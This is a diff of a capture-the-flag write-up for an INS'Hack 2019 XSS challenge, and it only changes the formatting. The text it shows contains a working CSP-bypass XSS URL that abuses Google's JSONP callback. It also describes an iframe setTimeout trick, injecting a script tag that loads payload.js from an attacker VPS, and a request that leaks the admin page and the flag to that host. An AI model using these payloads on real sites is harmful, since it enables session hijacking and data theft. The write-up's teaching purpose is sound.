@@ -61,7 +61,7 @@ generate the following HTML :
 
 ![admin_page](/assets/img/inshack-2019/admin_page.png)
 
-On the /admin page, we have a form from which we can send a URL. This URL will
+On the `/admin` page, we have a form from which we can send a URL. This URL will
 be visited by an "admin". From this feature alone, we can determine that we're dealing with
 an XSS challenge.
 
@@ -223,7 +223,7 @@ There are a few restrictions though : the `callback` parameter can only contain 
 and dots (`.`). Therefore we can only do one function call.
 
 With this limited control, we are able to get a valid XSS PoC ( an `alert()` call) on the
-/article page, bypassing CSP : `https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=%3Cscript/src=&unit=https://www.google.com/complete/search?client=chrome%26q=hello%26callback=alert%3E%3C/script%3E`
+`/article` page, bypassing CSP : `https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=%3Cscript/src=&unit=https://www.google.com/complete/search?client=chrome%26q=hello%26callback=alert%3E%3C/script%3E`
 
 ![alert_poc](/assets/img/inshack-2019/alert_poc.png)
 
@@ -283,11 +283,13 @@ and `frame3` because its origin (`https://some_random_domain`) is different.
 
 ## Bypassing CSP : Obtaining XSS on /admin
 
-Using the behavior mentioned above, we can obtain XSS on /admin like so :
+Using the behavior mentioned above, we can obtain XSS on `/admin` like so :
 
-1. Host a page with 2 iframes : one pointing to /admin and another pointing to /article
-2. Trigger the XSS on /article using the `top.admin_frame.setTimeout` callback parameter, which
+1. Host a page with 2 iframes : one pointing to `/admin` and another pointing to `/article`
+
+2. Trigger the XSS on `/article` using the `top.admin_frame.setTimeout` callback parameter, which
 in turn will eval the contents of the `q` parameter in the context of the `/admin` page.
+
 3. Overwrite the HTML of the `/admin` page with  `<script src="http://my_vps/payload.js"></script>`
 
 This will give us JS execution on the `/admin` page, without being blocked by CSP.
@@ -312,7 +314,7 @@ any code hosted on `http://my_vps/payload.js` will be executed.
 
 ![xss_admin](/assets/img/inshack-2019/xss_admin.png)
 
-Finally we can host our original payload in payload.js order to leak /admin :
+Finally we can host our original payload in payload.js order to leak `/admin` :
 
 ```js
 var req = new XMLHttpRequest();
@@ -417,7 +419,7 @@ def routes(app, csp):
 </html>
 ```
 
-The leaked /admin page reveals the source code used on the server.
+The leaked `/admin` page reveals the source code used on the server.
 
 By looking at the `/article` route, if we send a `POST` request containing the JSON payload `{"secret" : "No one will never ever access this beauty", "url" : "http://my_vps"}`, the server will
 send the flag back to us.
